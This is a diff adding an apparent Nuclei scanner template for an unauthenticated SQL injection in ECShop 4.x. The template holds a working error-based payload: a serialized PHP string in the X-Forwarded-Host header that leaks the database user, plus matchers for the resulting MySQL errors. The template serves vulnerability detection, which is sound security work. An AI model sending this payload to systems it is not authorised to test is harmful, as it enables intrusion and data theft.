@@ -1,0 +1,33 @@
+id: ecshop4.x-sqli
+
+info:
+  name: ECShop 4.x SQLi
+  author: ritikchaddha
+  severity: high
+  description: ECShop V4.x `collection_list` SQL injection allows remote unauthenticated users to inject arbitrary SQL statements into via 'X-FORWARDED-HOST' header field.
+  reference: |
+    - https://github.com/vulhub/vulhub/tree/master/ecshop/collection_list-sqli
+    - https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw
+    - http://www.foreversong.cn/archives/1556
+  tags: sqli,php,ecshop
+
+requests:
+  - raw:
+      - |
+        GET /user.php?act=collection_list HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953auser_account|a:2:{s:7:"user_id";s:38:"0'-(updatexml(1,repeat(user(),2),1))-'";s:7:"payment";s:1:"4";}|45ea207d7a2b68c49582d2d22adf953a
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        regex:
+          - "MySQL server error report:Array"
+          - "XPATH syntax error:"
+          - "[error] =>"
+          - "[0] => Array"
+        condition: and
+
+      - type: status
+        status:
+          - 200
